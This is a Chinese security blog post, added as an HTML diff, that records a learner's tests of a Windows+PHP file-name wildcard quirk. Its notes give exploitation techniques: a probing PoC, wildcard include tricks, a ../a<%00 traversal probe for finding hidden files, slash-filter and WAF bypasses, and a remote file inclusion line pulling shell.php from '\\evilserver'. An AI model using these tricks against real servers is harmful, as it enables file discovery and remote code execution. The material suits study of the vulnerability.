@@ -1,0 +1,975 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="今天在网上看到一个 win+php 组合的 Bug：Windows 下 php 中访问文件名使用 &lt; &gt; 将会被替换成 * ?，分别代表 N 个任意字符与 1 个任意字符。这篇是学习的测试记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows+PHP&#x3D;路径爆破?">
+<meta property="og:url" content="https://www.tr0y.wang/2018/04/08/WinPHPBug/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="今天在网上看到一个 win+php 组合的 Bug：Windows 下 php 中访问文件名使用 &lt; &gt; 将会被替换成 * ?，分别代表 N 个任意字符与 1 个任意字符。这篇是学习的测试记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/WinPHPBug/1540348791.png!blog">
+<meta property="og:image" content="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png">
+<meta property="article:published_time" content="2018-04-08T15:22:15.000Z">
+<meta property="article:modified_time" content="2021-04-13T09:32:35.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Vuln">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/WinPHPBug/1540348791.png!blog">
+  
+  
+  
+  <title>Windows+PHP=路径爆破? - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Windows+PHP=路径爆破?"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2018-04-08 15:22" pubdate>
+          2018年4月8日 15:22:15
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="阅读笔记"
+        id="heading-1dc2a11297f6b1a1a33974a34749e3d6" role="tab" data-toggle="collapse" href="#collapse-1dc2a11297f6b1a1a33974a34749e3d6"
+        aria-expanded="true"
+      >
+        阅读笔记
+        <span class="list-group-count">(11)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-1dc2a11297f6b1a1a33974a34749e3d6"
+           role="tabpanel" aria-labelledby="heading-1dc2a11297f6b1a1a33974a34749e3d6">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2018/11/07/CSRFMeiTuan/" title="FreeBuf 文章：如何防止CSRF攻击？"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">FreeBuf 文章：如何防止CSRF攻击？</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2018/06/18/MySQL%E7%9A%84BIGINT%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="MySQL 的 BIGINT 报错注入"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">MySQL 的 BIGINT 报错注入</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2018/04/07/SQL%E6%B3%A8%E5%85%A5%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90-WooYun/" title="SQL 注入关联分析"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">SQL 注入关联分析</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2018/04/08/WinPHPBug/" title="Windows+PHP=路径爆破?"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">Windows+PHP=路径爆破?</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/11/11/JSDomBook/" title="《JavaScript DOM 编程艺术》"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">《JavaScript DOM 编程艺术》</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/12/24/SQLInjection/" title="《SQL 注入攻击与防御》"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">《SQL 注入攻击与防御》</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2018/01/22/WEBFS/" title="《Web 前端黑客技术揭秘》"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">《Web 前端黑客技术揭秘》</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/11/04/TJMMX-BOOK/" title="《图解密码学》"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">《图解密码学》</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2018/10/14/sorts/" title="九大排序算法的 Python 实现"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">九大排序算法的 Python 实现</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2018/11/03/XSSMeiTuan/" title="如何防止XSS攻击？"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">如何防止XSS攻击？</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Windows+PHP=路径爆破?</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：4 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>今天在网上看到一个 win+php 组合的 Bug：Windows 下 php 中访问文件名使用 <code>&lt;</code> <code>&gt;</code> 将会被替换成 <code>*</code> <code>?</code>，分别代表 N 个任意字符与 1 个任意字符。这篇是学习的测试记录</p>
+<span id="more"></span>
+<h2 id="漏洞信息">漏洞信息</h2>
+<h3 id="poc">Poc</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">255</span>; <span class="hljs-variable">$i</span>++) &#123;<br>	<span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;1.ph&#x27;</span> . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br>	<span class="hljs-variable">$tmp</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$tmp</span>)) <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>) . <span class="hljs-string">&quot;\r\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>已知 1.php 存在，以上脚本访问的结果是：</p>
+<blockquote>
+<p>1.php</p>
+<p>1.phP</p>
+<p>1.ph&lt;</p>
+<p>1.ph&gt;</p>
+</blockquote>
+<p>都能得到返回。</p>
+<p>前两种能返回结果是总所周知的（因为 windows 的文件系统支持大小的互转的机制），另外的两种返回比较特殊：</p>
+<p>在 win+php 中</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">字符”&gt;”被替换成”<span class="hljs-string">?”</span>，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符<br></code></pre></td></tr></table></figure>
+<p>关于该 bug 可以利用的函数我们已经列了如下一表：</p>
+<figure>
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/WinPHPBug/1540348791.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="函数" /><figcaption aria-hidden="true">函数</figcaption>
+</figure>
+<h3 id="利用方法总结">利用方法总结</h3>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs stata">当调用 FindFirstFile()函数时，”&lt;”被替换成”*”,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，为了确保能够使”&lt;”被替换成”*”,应当采用”&lt;&lt;”。EXAMPLE:<br>	<span class="hljs-keyword">include</span>(‘<span class="hljs-keyword">shell</span>&lt;’); <br>或者:<br>	<span class="hljs-keyword">include</span>(‘<span class="hljs-keyword">shell</span>&lt;&lt;’); <br>	<span class="hljs-comment">//当文件夹中超过一个以 shell 打头的文件时，</span><br>	<span class="hljs-comment">//该执行取按字母表排序后的第一个文件。 </span><br>	<br>当调用 FindFirstFile()函数时，”&gt;”被替换成”?”,这意味这”&gt;”可以替换单个任意字符。EXAMPLE：<br>	<span class="hljs-keyword">include</span>(‘<span class="hljs-keyword">shell</span>.p&gt;p’); <br>	<span class="hljs-comment">//当文件中超过一个以 shell.p?p 通配时，</span><br>	<span class="hljs-comment">//该执行取按字母表排序后的第一个文件。</span><br>	<br>当调用 FindFirstFile()函数时，”””(双引号)被替换成”.”。EXAMPLE:<br>	<span class="hljs-keyword">include</span>(‘<span class="hljs-keyword">shell</span>”php’); <br>	<span class="hljs-comment">//===&gt;include(‘shell.php’);</span><br>如果文件名第一个字符是”.”的话，读取时可以忽略之。EXAMPLE：<br>	fopen(‘.htacess’); <br>	<span class="hljs-comment">//==&gt;fopen(‘htacess’); </span><br>	<span class="hljs-comment">//加上第一点中的利用 ==&gt;fopen(‘h&lt;&lt;’); </span><br><br>文件名末尾可以加上一系列的/或者\的合集，你也可以在/或者\中间加上.字符，只要确保最后一位为”.” EXAMPLE：<br>	fopen(“config.ini\\.<span class="hljs-comment">// \/\/\/.”);==&gt; 	</span><br>	fopen(‘config.ini\./.\.’); ==&gt;<br>	fopen(‘config.ini<span class="hljs-comment">/////.’)==&gt;</span><br>	fopen(‘config.ini…..’) <br>	<span class="hljs-comment">//译者注：此处的利用我不是很理解，有何作用？截断？</span><br>	<br>该函数也可以调用以”\\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费 4 秒钟的时间，并可能触发时间响应机制以及 max_execution_time 抛错。所幸的是，该利用可以用来绕过 allow_url_fopen=Off 并最终导致一个 RFI（远程文件包含）EXAMPLE：<br>	<span class="hljs-keyword">include</span> (‘\\evilserver\<span class="hljs-keyword">shell</span>.php’);<br>	<br>用以下方法还可以切换文件的盘名：<br>	<span class="hljs-keyword">include</span>(‘\\.\C:\my\<span class="hljs-keyword">file</span>.php\..\..\..\<span class="hljs-keyword">D</span>:\anotherfile.php’);<br>选择磁盘命名语法可以用来绕过斜线字符过滤<br>	file_get_contents(‘C:<span class="hljs-keyword">boot</span>.ini’); <br>	<span class="hljs-comment">//==&gt; file_get_contents (‘C:/boot.ini’);</span><br>在 php 的命令行环境下（php.exe）,关于系统保留名文件的利用细节。EXAMPLE:<br>	file_get_contents(‘C:/tmp/con.jpg’); <br>	<span class="hljs-comment">//此举将会无休无止地从 CON 设备读取 0 字节，直到遇到 eof</span><br>EXAMPLE:<br>	file_put_contents(‘C:/tmp/con.jpg’,chr(0×07)); <br>	<span class="hljs-comment">//此举将会不断地使服务器发出类似哔哔的声音</span><br></code></pre></td></tr></table></figure>
+<h3 id="更深入的利用方法">更深入的利用方法</h3>
+<p>除了以上已经展示的方法，你可以用下面的姿势来绕过 WAF 或者文件名过滤</p>
+<p>请思考该例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/images/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>].<span class="hljs-string">&quot;.jpg&quot;</span>);<br><span class="hljs-comment">//or another function from Table 1, i.e. include().</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>访问 test.php?a=../a&lt;%00 可能出现两种结果：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">warning: <span class="hljs-built_in">include</span>(/images/../<span class="hljs-keyword">a</span>&lt;) [function.<span class="hljs-built_in">include</span>]: failed <span class="hljs-built_in">to</span> <span class="hljs-built_in">open</span> stream:Invalid argument <span class="hljs-keyword">in</span>...<br><br>Warning: <span class="hljs-built_in">include</span>(/images/../<span class="hljs-keyword">a</span>&lt;) [function.<span class="hljs-built_in">include</span>]: failed <span class="hljs-built_in">to</span> <span class="hljs-built_in">open</span> stream:Permission denied...<br></code></pre></td></tr></table></figure>
+<p>如果是第一种情况，说明不存在 a 打头的文件，第二种则存在。</p>
+<p>此外，有记录显示，有时网站会抛出如下错误：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(/admin_h1d3) [<span class="hljs-keyword">function</span>.<span class="hljs-keyword">include</span>]: failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: Permission denied..<br></code></pre></td></tr></table></figure>
+<p>这说明该文件夹下存在一个以上以 a 打头的文件（夹），并且第一个就是 admin_h1d3</p>
+<h2 id="本地实际测试">本地实际测试</h2>
+<p>在 win10 上测试了一下，发现这个利用的语句很奇怪，似乎没有规律。</p>
+<p><code>&lt;</code> 被替换成 <code>*</code> 是没错，但是 <code>*</code> 应该是前面字符重复 0-n 次。然而测试的时候发现</p>
+<p><code>1&lt;php</code> 居然也可以。。。所以先记着 win+php 有这么个缺陷，以后要用到的时候再回来看看。</p>
+<p>最后，win 下建立 <code>.htacess</code> 需要用 cmd 语句：</p>
+<p><code>copy con .htaccess</code></p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">来呀快活呀</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" class="category-chain-item">阅读笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Vuln/">#Vuln</a>
+      
+        <a href="/tags/PHP/">#PHP</a>
+      
+        <a href="/tags/Windows/">#Windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Windows+PHP=路径爆破?</div>
+      <div>https://www.tr0y.wang/2018/04/08/WinPHPBug/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2018年4月8日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2021年4月13日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/04/10/XSSPayloads/" title="关于 XSS 的一些搜集">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">关于 XSS 的一些搜集</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/04/08/PHPFunc/" title="PHP 记录">
+                        <span class="hidden-mobile">PHP 记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
